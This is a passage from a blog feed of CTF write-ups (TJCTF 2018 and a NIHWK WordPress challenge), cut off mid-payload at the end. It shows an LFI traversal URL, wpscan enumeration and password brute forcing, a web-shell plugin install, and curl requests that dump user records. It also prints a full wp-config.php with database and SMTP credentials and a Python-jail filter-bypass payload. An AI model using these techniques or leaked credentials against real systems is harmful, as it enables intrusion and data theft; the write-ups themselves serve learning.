https://programmable_hyperlinked_pasta.tjctf.org/?lang=../flag.txt then!Hey-ho! Success. Flag is : tjctf{l0c4l_f1l3_wh4t?}After thoughtsEven if basic, it took me a few tries and a few extra-minutes to figure this one out. I had already used LFI exploitation before, so I wasn’t lost here. On a sidenote, I must admit that the whole “pasta” joke still makes me laugh today. You gotta love the PHP hatred. :heart:]]></content>
      <categories>
        
      </categories>
      <tags>
        
          <tag> tjctf-2018 </tag>
        
          <tag> write-up </tag>
        
          <tag> web </tag>
        
      </tags>
      <tags></tags>
    </entry>
  
    <entry>
      <title><![CDATA[NIHWK training CTF - WordPress]]></title>
      <url>/2018/08/22/NIHWK-Write-Up-Wordpress/</url>
      <content type="text"><![CDATA[ChallengeCan you find the flag inside server? http://jordpress.herokuapp.com/[1200 points]Written by LatticeInitial thoughtsI wanted to do some of the training challenges before the actual CTF coming up this week-end. I did some of the easy ones out of boredom and then looked at this WordPress one. What striked me was that it only had 1 solve and still gave a good amount of points compared to the others. I wondered if it was really hard, or if people just weren’t that much into WordPress exploitation. Anyway, I dived in, seeing in this challenge a nice way to spend my evening at the hotel I was staying in.ExploitationHere we are. A home page with some articles, unfortunately half-written in a language I do not speak.I looked around, tried some common logins at wp-login.php (such as “admin, admin” or “admin, password”…) but nothing worked.I figured I needed to start using tools, so I fired up Kali and went for WPSCAN.wpscan --url http://jordpress.herokuapp.com/ and wpscan --url http://jordpress.herokuapp.com/ --enumerate p didn’t gave me much. WordPress’ version was outdated, so a bunch of CVEs poped out, one for getting RCE. I tried it, no luck : it failed.I decided to go back to WPSCAN and try something different, a little easier than exploiting a CVE, and see what I could get.Since I do not speak mandarin, chinese or whatever this was, I couldn’t really read posts and see what was said and who posted it. So I asked my bilingual friend WPSCAN to do it for me by enumerating users :wpscan --url http://jordpress.herokuapp.com/ --enumerate u[+] Enumerating usernames ...[+] Identified the following 1 user/s:    +----+-------+---------+    | Id | Login | Name    |    +----+-------+---------+    | 1  | admin | 404 Not |    +----+-------+---------+[!] Default first WordPress username 'admin' is still usedThat’s a start. “admin” is still in use, and seems to be the only one… I guess that shall be the entry point.Let’s see if we can do something dumb, by bruteforcing the log-in, since XMLRPC was available :wpscan --url http://jordpress.herokuapp.com/ --wordlist /usr/share/wordlists/rockyou.txt --username admin[+] Starting the password brute forcer  [+] [SUCCESS] Login : admin Password : 12345678  Brute Forcing 'admin' Time: 00:00:23  +----+-------+------+----------+  | Id | Login | Name | Password |  +----+-------+------+----------+  |    | admin |      | 12345678 |  +----+-------+------+----------+Meeeh. Easier than I thought for this much points. But maybe I’m not done yet. Let’s log-in as admin and see what’s what.Once logged in, I saw some plugins being installed but they were all up to date and not really exploitable (akismet…).I started thinking about exploits that needed authentication as admin to get RCE, but then I remembered : this WordPress installation, unlike all the other ones I did on HackTheBox, was indeed connected to the world wide web.I could just go for plugins’ shopping.Searching for “shell”, I found this nice little guy called WPTerm. I then installed it and was able to get a shell, just like that, on the server as dyno user.(Thanks to Jerome Bruandet for this amazing plugin!)u5412:/app $ iduid=5412(u5412) gid=5412(dyno) groups=5412(dyno)Now comes the stupid part. I was so familiar with HTB’s kind of WordPress exploitation that I didn’t even think about taking a breath after I landed that shell.I immediately started looking into wp-config.php to gather some credentials.1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980818283848586878889909192&lt;?php/** * The base configuration for WordPress * * The wp-config.php creation script uses this file during the * installation. You don't have to use the web site, you can * copy this file to "wp-config.php" and fill in the values. * * This file contains the following configurations: * * * MySQL settings * * Secret keys * * Database table prefix * * ABSPATH * * @link https://codex.wordpress.org/Editing_wp-config.php * * @package WordPress */// ** MySQL settings - You can get this info from your web host ** ///** The name of the database for WordPress */define('DB_NAME', 'ado77oc5a8ntg8qf');/** MySQL database username */define('DB_USER', 'b7gqhve5j2viqqwd');/** MySQL database password */define('DB_PASSWORD', 'eyekawepi48wol7h');/** MySQL hostname */define('DB_HOST', 'y06qcehxdtkegbeb.cbetxkdyhwsb.us-east-1.rds.amazonaws.com');/** Database Charset to use in creating database tables. */define('DB_CHARSET', 'utf8');/** The Database Collate type. Don't change this if in doubt. */define('DB_COLLATE', '');define('WPMS_ON', true);define('WPMS_SMTP_PASS', 'Ynnhoj!@34');/**#@+ * Authentication Unique Keys and Salts. * * Change these to different unique phrases! * You can generate these using the {@link https://api.wordpress.org/secret-key/1.1/salt/ WordPress.org secret-key service} * You can change these at any point in time to invalidate all existing cookies. This will force all users to have to log in again. * * @since 2.6.0 */define('AUTH_KEY',         'put your unique phrase here');define('SECURE_AUTH_KEY',  'put your unique phrase here');define('LOGGED_IN_KEY',    'put your unique phrase here');define('NONCE_KEY',        'put your unique phrase here');define('AUTH_SALT',        'put your unique phrase here');define('SECURE_AUTH_SALT', 'put your unique phrase here');define('LOGGED_IN_SALT',   'put your unique phrase here');define('NONCE_SALT',       'put your unique phrase here');/**#@-*//** * WordPress Database Table prefix. * * You can have multiple installations in one database if you give each * a unique prefix. Only numbers, letters, and underscores please! */$table_prefix  = 'wp_';/** * For developers: WordPress debugging mode. * * Change this to true to enable the display of notices during development. * It is strongly recommended that plugin and theme developers use WP_DEBUG * in their development environments. * * For information on other constants that can be used for debugging, * visit the Codex. * * @link https://codex.wordpress.org/Debugging_in_WordPress */define('WP_DEBUG', false);/* That's all, stop editing! Happy blogging. *//** Absolute path to the WordPress directory. */if ( !defined('ABSPATH') )    define('ABSPATH', dirname(__FILE__) . '/');/** Sets up WordPress vars and included files. */require_once(ABSPATH . 'wp-settings.php');And I got excited. I thought “that’s it, the flag must be inside the MySQL db, or then it must have something to do with the WPMS_SMTP_PASS”. Oh boi, was I overthinking this.Anyway, I connected to the remote MySQL DB and started looking.~# mysql -u b7gqhve5j2viqqwd -p -h y06qcehxdtkegbeb.cbetxkdyhwsb.us-east-1.rds.amazonaws.com -D ado77oc5a8ntg8qfEnter password: Reading table information for completion of table and column namesYou can turn off this feature to get a quicker startup with -AWelcome to the MariaDB monitor.  Commands end with ; or \g.Your MySQL connection id is 6144783Server version: 5.7.19-log MySQL Community Server (GPL)Copyright (c) 2000, 2017, Oracle, MariaDB Corporation Ab and others.Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.MySQL [ado77oc5a8ntg8qf]&gt; show databases;+--------------------+| Database           |+--------------------+| information_schema || ado77oc5a8ntg8qf   |+--------------------+2 rows in set (0.16 sec)MySQL [ado77oc5a8ntg8qf]&gt; use ado77oc5a8ntg8qf;Database changedMySQL [ado77oc5a8ntg8qf]&gt; show tables;+----------------------------+| Tables_in_ado77oc5a8ntg8qf |+----------------------------+| wp_bp_activity             || wp_bp_activity_meta        || wp_bp_notifications        || wp_bp_notifications_meta   || wp_bp_xprofile_data        || wp_bp_xprofile_fields      || wp_bp_xprofile_groups      || wp_bp_xprofile_meta        || wp_commentmeta             || wp_comments                || wp_links                   || wp_options                 || wp_postmeta                || wp_posts                   || wp_signups                 || wp_term_relationships      || wp_term_taxonomy           || wp_termmeta                || wp_terms                   || wp_usermeta                || wp_users                   || wp_xyz_ips_short_code      |+----------------------------+22 rows in set (0.13 sec)MySQL [ado77oc5a8ntg8qf]&gt;And I looked, and I looked, and I looked… It looked at posts revisions, at users deletions, at posts’ meta… Nothing to be found.I went and looked around in /etc. I looked at ssh configuration. I looked at cronjobs. I looked at passwd, I tried some dumb shit like sudoing stuff.I started to think about the SMTP password then.With my bladder full, and my energy low, I decided to take a break to unburden myself. It was during midstream that it came to me, an insight from the pee-gods.Wait a minute… I didn’t even fucking look around! As soon as I landed this shell, I started doing wp-config.php and MySQL enumeration without even doing a proper ls -al in the landing dir!Long story short, there was indeed a stupid dir in /app, with the flag in it.u5412:/app/123213fda9fd7a089fd8afdsafdsaffdafda $ cat flagflag{wordpress_1s_vulnerable!!!!!!!}Flag was : flag{wordpress_1s_vulnerable!!!!!!!}After thoughtsBefore starting to overthink a challenge, ALWAYS go with the basics. Always assume the actions you need to take in order to get the flag are dumb. If nothing dumb works, you can start thinking.All in all, it’s an interesting, even if basic, WordPress exploitation challenge. I was amazed to see that we were only 2 guys to have solved it, when other web challenges, which gave much more points, had so many more solves.I guess, as I said earlier, that people are just not into WordPress’ exploitation anymore. :smile:]]></content>
      <categories>
        
      </categories>
      <tags>
        
          <tag> nihwk-training-2018 </tag>
        
          <tag> write-up </tag>
        
          <tag> web </tag>
        
          <tag> wordpress </tag>
        
      </tags>
      <tags></tags>
    </entry>
  
    <entry>
      <title><![CDATA[TJCTF - Python Reversing]]></title>
      <url>/2018/08/21/TJCTF-Write-Up-Python-Reversing/</url>
      <content type="text"><![CDATA[ChallengeFound this flag checking file and it is quite vulnerable[40 points]Written by jfrucht25First thoughtsLooking at this code, I knew I’d have to bruteforce very likely.123456789101112131415import numpy as npflag = 'redacted'np.random.seed(12345)arr = np.array([ord(c) for c in flag])other = np.random.randint(1,5,(len(flag)))arr = np.multiply(arr,other)b = [x for x in arr]lmao = [ord(x) for x in ''.join(['ligma_sugma_sugondese_'*5])]c = [b[i]^lmao[i] for i,j in enumerate(b)]print(''.join(bin(x)[2:].zfill(8) for x in c))# original_output was 1001100001011110110100001100001010000011110101001100100011101111110100011111010101010000000110000011101101110000101111101010111011100101000011011010110010100001100010001010101001100001110110100110011101Exploitation123456789101112131415161718192021222324252627282930#!/usr/bin/pythonimport numpy as npimport sysimport stringprint("[~] Starting")original = '1001100001011110110100001100001010000011110101001100100011101111110100011111010101010000000110000011101101110000101111101010111011100101000011011010110010100001100010001010101001100001110110100110011101'flag = 'tjctf{'j=0temp = ''for l in range (1,500):        for k in string.printable:                temp = flag + k                np.random.seed(12345)                array = np.array([ord(c) for c in temp])                other = np.random.randint(1,5,(len(temp)))                array = np.multiply(array,other)                b = [x for x in array]                lmao = [ord(x) for x in ''.join(['ligma_sugma_sugondese_'*5])]                c = [b[i]^lmao[i] for i,j in enumerate(b)]                temp = (''.join(bin(x)[2:].zfill(8) for x in c))                tempint = 8*6+l                if temp == original[0:tempint]:                        flag = flag + k                        print("[+] Got...: " + flag)                        sys.stdout.write("\033[F")                        sys.stdout.write("\033[K")print("[+] Got...: " + flag)# ./script.py [~] Starting[+] Got...: tjctf{pYth0n_1s_tr1v14l}Flag : tjctf{pYth0n_1s_tr1v14l}After thoughtsTook me quite a lot of time because I’m still a python beginner, and all those functions and transformations kept making my brain suffer, but I got it eventually!]]></content>
      <categories>
        
      </categories>
      <tags>
        
          <tag> tjctf-2018 </tag>
        
          <tag> write-up </tag>
        
          <tag> reversing </tag>
        
          <tag> python </tag>
        
      </tags>
      <tags></tags>
    </entry>
  
    <entry>
      <title><![CDATA[TJCTF - Central Saving Account]]></title>
      <url>/2018/08/12/TJCTF-Write-Up-Central-Saving-Account/</url>
      <content type="text"><![CDATA[ChallengeI seem to have forgotten the password for my savings account. What am I gonna do?The flag is not in standard flag format.[10 points]Written by evanyeyeyeInitial thoughtsA single password input, uh. This could go multiple different ways. Obviously not bruteforce, because it was a web-shared challenge… Let’s find out!ExploitationLet’s take a peek at the source code, shall we?12345678910111213141516171819202122232425&lt;!DOCTYPE html&gt;&lt;html lang="en"&gt;&lt;head&gt;  &lt;title&gt;Central Savings Account&lt;/title&gt;  &lt;meta charset="utf-8"&gt;  &lt;meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no"&gt;  &lt;link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/4.0.0-beta.2/css/bootstrap.min.css" integrity="sha384-PsH8R72JQ3SOdhVi3uxftmaW6Vc51MKb0q5P2rRUpPvrszuE4W1povHYgTpBfshb" crossorigin="anonymous"&gt;&lt;/head&gt;&lt;body&gt;  &lt;div class="container-fluid" style="padding-top: 100px; width: 60%; max-width: 500px"&gt;    &lt;h1&gt;Central Savings Account&lt;/h1&gt;    &lt;h3&gt;Please login to proceed&lt;/h3&gt;    &lt;form id="login-form"&gt;      &lt;div class="form-group"&gt;        &lt;input type="password" class="form-control" id="password" placeholder="Password"&gt;      &lt;/div&gt;      &lt;button type="submit" class="btn btn-primary"&gt;Log In&lt;/button&gt;    &lt;/form&gt;  &lt;/div&gt;  &lt;script src="https://code.jquery.com/jquery-3.2.1.slim.min.js" integrity="sha384-KJ3o2DKtIkvYIK3UENzmM7KCkRr/rE9/Qpg6aAZGJwFDMVNA/GpGFF93hXpG5KkN" crossorigin="anonymous"&gt;&lt;/script&gt;  &lt;script src="https://cdnjs.cloudflare.com/ajax/libs/popper.js/1.12.3/umd/popper.min.js" integrity="sha384-vFJXuSJphROIrBnz7yo7oB41mKfc8JzQZiCq4NCceLEaO4IHwicKwpJf9c9IpFgh" crossorigin="anonymous"&gt;&lt;/script&gt;  &lt;script src="https://maxcdn.bootstrapcdn.com/bootstrap/4.0.0-beta.2/js/bootstrap.min.js" integrity="sha384-alpBpkh1PFOepccYVYDB4do5UnbKysX5WZXm3XxPqe5iKTfUKjNkCk9SaVuEZflJ" crossorigin="anonymous"&gt;&lt;/script&gt;  &lt;script src="/static/main.js"&gt;&lt;/script&gt;&lt;/body&gt;&lt;/html&gt;Nothing much here. Let’s go through the javascript and look for an easy CTRL + F. I’ll start with main.js because the other scripts seem to be standard ones.123456789$(document).ready(function() {    $("#login-form").submit(function() {        if (md5($("#password").val()).toLowerCase() === "698967f805dea9ea073d188d73ab7390") {            $("html").html("&lt;h1&gt;Login Succeeded!&lt;/h1&gt;");        }        else {            $("html").html("&lt;h1&gt;Login Failed!&lt;/h1&gt;");        }    })Look at what I found, waiting for us at the bottom of the script! Thanks, CTRL + F “pass”! :smile:We now have a md5 hash.698967f805dea9ea073d188d73ab7390Let’s just paste it on Hashtoolkit and get our flag.Flag : tjctf{avalon}After thoughtsKinda basic, still enjoyable.]]></content>
      <categories>
        
      </categories>
      <tags>
        
          <tag> tjctf-2018 </tag>
        
          <tag> write-up </tag>
        
          <tag> web </tag>
        
      </tags>
      <tags></tags>
    </entry>
  
    <entry>
      <title><![CDATA[TJCTF - RC4 took an L]]></title>
      <url>/2018/08/12/TJCTF-Write-Up-RC4-took-an-L/</url>
      <content type="text"><![CDATA[ChallengeAlphabet: #_23456789abcdefghijklmnopqrstuvwxyzKey: pq_xc589r3nb#mgjtkh7w2dlfvy4eaoi6uzsCiphertext: wpwt#5ng4_qbitp#8mq59r_g866c4t59c6vy6tisj4af6bprfnbd_wrq2wjmr4ld_s26a7i#biiyqjolq8lus_wfusfkj8xv2qrrv3etab_marovc#uuoueyl[40 points]Written by evanyeyeyeInitial thoughtsRC4 isn’t new to me. I already had a few challenges about this encryption cipher. What bugged me is the “took an L” part, but I found out why pretty quickly (and luckily).ExploitationI really thought this wasn’t “classic RC4” so I didn’t bother trying to decipher it that way. I started google’ing immediately. And what I found by google’ing the alphabet used for the encryption got me where I needed to be : it was LC4, not RC4.From here, it was pretty straight forward. Let’s first install the LC4 lib for Python (because Python &gt; all of course).~# pip install lc4Collecting lc4  Downloading https://files.pythonhosted.org/packages/84/41/d7aeb7fe68b7aef2bb6a8dfce3b158ffee9440acf87e3ffbd13d75395991/lc4-0.1.6.tar.gzRequirement already satisfied: numpy in /usr/lib/python2.7/dist-packages (from lc4)Building wheels for collected packages: lc4  Running setup.py bdist_wheel for lc4 ... done  Stored in directory: /root/.cache/pip/wheels/8a/87/08/c1dca3b084636fed4c03040599ed6d7bfda70a20938b448b00Successfully built lc4Installing collected packages: lc4Successfully installed lc4-0.1.6Let’s then simply decrypt the flag out…:~# pythonPython 2.7.14+ (default, Mar 13 2018, 15:23:44) [GCC 7.3.0] on linux2Type "help", "copyright", "credits" or "license" for more information.&gt;&gt;&gt; import lc4&gt;&gt;&gt; key = "pq_xc589r3nb#mgjtkh7w2dlfvy4eaoi6uzs"&gt;&gt;&gt; enc = "wpwt#5ng4_qbitp#8mq59r_g866c4t59c6vy6tisj4af6bprfnbd_wrq2wjmr4ld_s26a7i#biiyqjolq8lus_wfusfkj8xv2qrrv3etab_marovc#uuoueyl"&gt;&gt;&gt; print("Flag : " + lc4.decrypt(key, enc))Flag : i_hope_that_by_making_this_long_you_will_assume_substitution_cipher_and_go_to_quip_qiup_the_flag_is#elsie_four_is_not_rc4Booya! And the flag is : tjctf{elsie_four_is_not_rc4}After thoughtsI could’ve spend hours trying to figure this challenge out, writing python scripts, looking web-pages… But I got lucky and googled first the string I needed to google. All in all, this challenge took me at most ten minutes, where it could have taken me hours if I didn’t have this hunch about the alphabet. Pretty fun though!]]></content>
      <categories>
        
      </categories>
      <tags>
        
          <tag> tjctf-2018 </tag>
        
          <tag> write-up </tag>
        
          <tag> crypto </tag>
        
      </tags>
      <tags></tags>
    </entry>
  
    <entry>
      <title><![CDATA[TJCTF - Ess Kyoo Ell]]></title>
      <url>/2018/08/12/TJCTF-Write-Up-Ess-Kyoo-Ell/</url>
      <content type="text"><![CDATA[ChallengeFind the IP address of the admin user! (flag is tjctf{[ip]})[40 points]Written by okulkarniInitial thoughtsThat challenge name is pretty obvious : we’re going to have to exploit some poorly configured SQL.ExploitationWe are presented with a quite simple login page. Let’s try some things! I will see what email=a@a.a and password=1 give me.Uh. Interesting. The script is made so that we can get any error message (or anything else) SQL returns. This should be easy to exploit.Let’s switch to curl, shall we?~# curl --data "email=a@a.a&amp;&amp;password=1" https://ess-kyoo-ell.tjctf.org/ | grep database  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current                                 Dload  Upload   Total   Spent    Left  Speed100  7603    0  7580  100    23  17710     53 --:--:-- --:--:-- --:--:-- 17764            &lt;p id="profile-name" class="profile-name-card"&gt;This is what I got about you from the database: no such column: password&lt;/p&gt;Thanks to grep, we got the line that matters. Now let’s try some basic SQL column’s name instead of the given parameters email &amp;&amp; password.~# curl --data "id=1" https://ess-kyoo-ell.tjctf.org/ | grep database  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current                                 Dload  Upload   Total   Spent    Left  Speed100  8076    0  8072  100     4  20383     10 --:--:-- --:--:-- --:--:-- 20445            &lt;p id="profile-name" class="profile-name-card"&gt;This is what I got about you from the database: {&amp;#39;id&amp;#39;: 1, &amp;#39;username&amp;#39;: &amp;#39;hdavidovsky0&amp;#39;, &amp;#39;first_name&amp;#39;: &amp;#39;Hamnet&amp;#39;, &amp;#39;last_name&amp;#39;: &amp;#39;Davidovsky&amp;#39;, &amp;#39;email&amp;#39;: &amp;#39;&lt;a href="/cdn-cgi/l/email-protection" class="__cf_email__" data-cfemail="e48c8085928d808b92978f9dd4a4978885978c808b90ca8b9683"&gt;[email&amp;#160;protected]&lt;/a&gt;&amp;#39;, &amp;#39;gender&amp;#39;: &amp;#39;Male&amp;#39;, &amp;#39;ip_address&amp;#39;: &amp;#39;202.100.56.108&amp;#39;}&lt;/p&gt;Uh, uh! Seems like we got a hit! Pretty easily nevertheless. Well, now we know that it will return any column value we ask for, aaaand… We know all the columns ids. Since we need to retrieve the administrator’s IP address, let’s ask for his column!~# curl --data "username=admin" https://ess-kyoo-ell.tjctf.org/ | grep database  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current                                 Dload  Upload   Total   Spent    Left  Speed100  8086    0  8072  100    14  16746     29 --:--:-- --:--:-- --:--:-- 16775            &lt;p id="profile-name" class="profile-name-card"&gt;This is what I got about you from the database: {&amp;#39;id&amp;#39;: 706, &amp;#39;username&amp;#39;: &amp;#39;admin&amp;#39;, &amp;#39;first_name&amp;#39;: &amp;#39;Administrative&amp;#39;, &amp;#39;last_name&amp;#39;: &amp;#39;User&amp;#39;, &amp;#39;email&amp;#39;: &amp;#39;&lt;a href="/cdn-cgi/l/email-protection" class="__cf_email__" data-cfemail="187c7d7e3576776c356c702b35797c752976586c727b6c7e36776a7f"&gt;[email&amp;#160;protected]&lt;/a&gt;&amp;#39;, &amp;#39;gender&amp;#39;: &amp;#39;Female&amp;#39;, &amp;#39;ip_address&amp;#39;: &amp;#39;145.3.1.213&amp;#39;}&lt;/p&gt;Well, well, well… Here it is! Flag is : tjctf{145.3.1.213}After thoughtsA pretty basic web challenge to be honest but still refreshing and nice to complete. I already had encountered such challenges in the past but it took me a little while to get back to it and figure it out, so… All in all, it was worth it!]]></content>
      <categories>
        
      </categories>
      <tags>
        
          <tag> tjctf-2018 </tag>
        
          <tag> write-up </tag>
        
          <tag> web </tag>
        
      </tags>
      <tags></tags>
    </entry>
  
    <entry>
      <title><![CDATA[TJCTF - Blank]]></title>
      <url>/2018/08/12/TJCTF-Write-Up-Blank/</url>
      <content type="text"><![CDATA[ChallengeSomeone told me there was a flag on this site, so why is it that I can only see blank?[5 points]Written by evanyeyeyeInitial thoughtsNot much.Exploitation12345678910111213141516171819202122&lt;!DOCTYPE html&gt;&lt;html lang="en"&gt;&lt;head&gt;&lt;meta charset="utf-8"&gt;&lt;title&gt;Blank&lt;/title&gt;&lt;meta name="viewport" content="width=device-width, initial-scale=1"&gt;&lt;style type="text/css"&gt;p {position: absolute;top: 35%;left: 50%;transform: translate(-50%, -50%);font-size: 100px;}&lt;/style&gt;&lt;/head&gt;&lt;body&gt;&lt;p&gt;『　　』&lt;/p&gt;&lt;!-- flag: tjctf{50urc3_c0d3_n3v3r_l0535} --&gt;&lt;/body&gt;&lt;/html&gt;After thoughtsErr… Not much.]]></content>
      <categories>
        
      </categories>
      <tags>
        
          <tag> tjctf-2018 </tag>
        
          <tag> write-up </tag>
        
          <tag> web </tag>
        
      </tags>
      <tags></tags>
    </entry>
  
    <entry>
      <title><![CDATA[TJCTF - Cookie Monster]]></title>
      <url>/2018/08/12/TJCTF-Write-Up-Cookie-Monster/</url>
      <content type="text"><![CDATA[ChallengeThe Cookie Monster is not a fan of horses[10 points]Written by okulkarniInitial thoughtsLet’s look at cookies.ExploitationFlag : tjctf{c00ki3s_over_h0rs3s}After thoughtsErr… Not much.]]></content>
      <categories>
        
      </categories>
      <tags>
        
          <tag> tjctf-2018 </tag>
        
          <tag> write-up </tag>
        
          <tag> web </tag>
        
      </tags>
      <tags></tags>
    </entry>
  
    <entry>
      <title><![CDATA[TJCTF - Mirror Mirror]]></title>
      <url>/2018/08/12/TJCTF-Write-Up-Mirror-Mirror/</url>
      <content type="text"><![CDATA[ChallengeIf you look closely, you can see a reflection.nc problem1.tjctf.org 8004[100 points]Written by Alaska47Initial thoughts# nc problem1.tjctf.org 8004Hi! Are you looking for the flag? Try get_flag() for free flags. Remember, wrap your input in double quotes. Good luck!&gt;&gt;&gt; …To be really honest here, this was my first pyjail. Ever. I had never heard of this kind of challenge before. I knew about “bash jail” or whatever ; but didn’t know it was a thing.Took me a lot of googling, trying stupid shit like “python console exploit” or “python console enum”, and I couldn’t find nothing. Luckily, a good man called Highsenburger69 told me “it’s a pyjail” and sent me this link. Game on.ExploitationAt first, I needed to do a little bit of enumeration. I started by trying random crap.# nc problem1.tjctf.org 8004Hi! Are you looking for the flag? Try get_flag() for free flags. Remember, wrap your input in double quotes. Good luck!&gt;&gt;&gt; get_flag("flag")f is not a valid character&gt;&gt;&gt; get_flag("()")You didn't guess the value of my super_secret_stringUh. So apparently, some characters aren’t allowed. Most likely, letters and numbers. Aaaaaand there seems to be a “super secret string” that should give me the flag.Using some commands, I then managed to find something interesting :# nc problem1.tjctf.org 8004Hi! Are you looking for the flag? Try get_flag() for free flags. Remember, wrap your input in double quotes. Good luck!&gt;&gt;&gt; dir&lt;built-in function dir&gt;&gt;&gt;&gt; dir(get_flag)['__call__', '__class__', '__closure__', '__code__', '__defaults__', '__delattr__', '__dict__', '__doc__', '__format__', '__get__', '__getattribute__', '__globals__', '__hash__', '__init__', '__module__', '__name__', '__new__', '__reduce__', '__reduce_ex__', '__repr__', '__setattr__', '__sizeof__', '__str__', '__subclasshook__', 'func_closure', 'func_code', 'func_defaults', 'func_dict', 'func_doc', 'func_globals', 'func_name']&gt;&gt;&gt; dir(get_flag.func_code)['__class__', '__cmp__', '__delattr__', '__doc__', '__eq__', '__format__', '__ge__', '__getattribute__', '__gt__', '__hash__', '__init__', '__le__', '__lt__', '__ne__', '__new__', '__reduce__', '__reduce_ex__', '__repr__', '__setattr__', '__sizeof__', '__str__', '__subclasshook__', 'co_argcount', 'co_cellvars', 'co_code', 'co_consts', 'co_filename', 'co_firstlineno', 'co_flags', 'co_freevars', 'co_lnotab', 'co_name', 'co_names', 'co_nlocals', 'co_stacksize', 'co_varnames']&gt;&gt;&gt; get_flag.func_code&lt;code object get_flag at 0x7f9f8fc644b0, file "/home/app/problem.py", line 15&gt;&gt;&gt;&gt; get_flag.func_code.co_consts(None, 'this_is_the_super_secret_string', 48, 57, 65, 90, 97, 122, 44, 95, ' is not a valid character', '%\xcb', "You didn't guess the value of my super_secret_string")Yey! I got it! Pretty easy for that much points. Anyway, the value of the super secret string is : this_is_the_super_secret_stringLet’s type it in and get our flag!&gt;&gt;&gt; get_flag("this_is_the_super_secret_string")Sorry, that's not allowed.Fuck me. I forgot some characters aren’t allowed. If you look at the previous snippet, you’ll see, next to the super secret string value, some numbers : 48, 57, 65, 90, 97, 122, 44, 95. Ascii codes for 0-9, A-Z, a-z, “,”-“_”. Those must be the forbidden characters.That’s where Highsenburger69’s link comes in handy. I can see that Wapiflapi managed to generate letters and numbers using special chars, abusing logical relations between True and False values.The interesting part was this :123456789def brainfuckize(nb):    if nb in [-2, -1, 0, 1]:        return ["~({}&lt;[])", "~([]&lt;[])",                 "([]&lt;[])",  "({}&lt;[])"][nb+2]    if nb % 2:        return "~%s" % brainfuckize(~nb)    else:        return "(%s&lt;&lt;({}&lt;[]))" % brainfuckize(nb/2)Seems amazing, kind of magic, but works! He even put an example a little below, so I tried it to understand exactly what was going on.Python 2.7.14+ (default, Mar 13 2018, 15:23:44) [GCC 7.3.0] on linux2Type "help", "copyright", "credits" or "license" for more information.&gt;&gt;&gt; `[`'%\xcb'`[{}&lt;[]::~(~({}&lt;[])&lt;&lt;({}&lt;[]))]%(((~(~(~(~(({}&lt;[])&lt;&lt;({}&lt;[]))&lt;&lt;({}&lt;[]))&lt;&lt;({}&lt;[]))&lt;&lt;({}&lt;[]))&lt;&lt;({}&lt;[]))&lt;&lt;({}&lt;[]))),`'%\xcb'`[{}&lt;[]::~(~({}&lt;[])&lt;&lt;({}&lt;[]))]%((((~(~(~(~({}&lt;[])&lt;&lt;({}&lt;[]))&lt;&lt;({}&lt;[]))&lt;&lt;({}&lt;[]))&lt;&lt;({}&lt;[]))&lt;&lt;({}&lt;[]))&lt;&lt;({}&lt;[]))),`'%\xcb'`[{}&lt;[]::~(~({}&lt;[])&lt;&lt;({}&lt;[]))]%(~(~(~(~((~(~({}&lt;[])&lt;&lt;({}&lt;[]))&lt;&lt;({}&lt;[]))&lt;&lt;({}&lt;[]))&lt;&lt;({}&lt;[]))&lt;&lt;({}&lt;[]))&lt;&lt;({}&lt;[]))),`'%\xcb'`[{}&lt;[]::~(~({}&lt;[])&lt;&lt;({}&lt;[]))]%((((((({}&lt;[])&lt;&lt;({}&lt;[]))&lt;&lt;({}&lt;[]))&lt;&lt;({}&lt;[]))&lt;&lt;({}&lt;[]))&lt;&lt;({}&lt;[]))),`'%\xcb'`[{}&lt;[]::~(~({}&lt;[])&lt;&lt;({}&lt;[]))]%(~(((~((~(~({}&lt;[])&lt;&lt;({}&lt;[]))&lt;&lt;({}&lt;[]))&lt;&lt;({}&lt;[]))&lt;&lt;({}&lt;[]))&lt;&lt;({}&lt;[]))&lt;&lt;({}&lt;[]))),`'%\xcb'`[{}&lt;[]::~(~({}&lt;[])&lt;&lt;({}&lt;[]))]%(~(~((((~(~({}&lt;[])&lt;&lt;({}&lt;[]))&lt;&lt;({}&lt;[]))&lt;&lt;({}&lt;[]))&lt;&lt;({}&lt;[]))&lt;&lt;({}&lt;[]))&lt;&lt;({}&lt;[]))),`'%\xcb'`[{}&lt;[]::~(~({}&lt;[])&lt;&lt;({}&lt;[]))]%(~(~(~((~(~(~({}&lt;[])&lt;&lt;({}&lt;[]))&lt;&lt;({}&lt;[]))&lt;&lt;({}&lt;[]))&lt;&lt;({}&lt;[]))&lt;&lt;({}&lt;[]))&lt;&lt;({}&lt;[]))),`'%\xcb'`[{}&lt;[]::~(~({}&lt;[])&lt;&lt;({}&lt;[]))]%(~(~(~(~((~(~({}&lt;[])&lt;&lt;({}&lt;[]))&lt;&lt;({}&lt;[]))&lt;&lt;({}&lt;[]))&lt;&lt;({}&lt;[]))&lt;&lt;({}&lt;[]))&lt;&lt;({}&lt;[]))),`'%\xcb'`[{}&lt;[]::~(~({}&lt;[])&lt;&lt;({}&lt;[]))]%((((((({}&lt;[])&lt;&lt;({}&lt;[]))&lt;&lt;({}&lt;[]))&lt;&lt;({}&lt;[]))&lt;&lt;({}&lt;[]))&lt;&lt;({}&lt;[]))),`'%\xcb'`[{}&lt;[]::~(~({}&lt;[])&lt;&lt;({}&lt;[]))]%(~(~((~(~(~(~({}&lt;[])&lt;&lt;({}&lt;[]))&lt;&lt;({}&lt;[]))&lt;&lt;({}&lt;[]))&lt;&lt;({}&lt;[]))&lt;&lt;({}&lt;[]))&lt;&lt;({}&lt;[]))),`'%\xcb'`[{}&lt;[]::~(~({}&lt;[])&lt;&lt;({}&lt;[]))]%(~((~((~((~({}&lt;[])&lt;&lt;({}&lt;[]))&lt;&lt;({}&lt;[]))&lt;&lt;({}&lt;[]))&lt;&lt;({}&lt;[]))&lt;&lt;({}&lt;[]))&lt;&lt;({}&lt;[]))),`'%\xcb'`[{}&lt;[]::~(~({}&lt;[])&lt;&lt;({}&lt;[]))]%((((((({}&lt;[])&lt;&lt;({}&lt;[]))&lt;&lt;({}&lt;[]))&lt;&lt;({}&lt;[]))&lt;&lt;({}&lt;[]))&lt;&lt;({}&lt;[]))),`'%\xcb'`[{}&lt;[]::~(~({}&lt;[])&lt;&lt;({}&lt;[]))]%(~((((~(~(~({}&l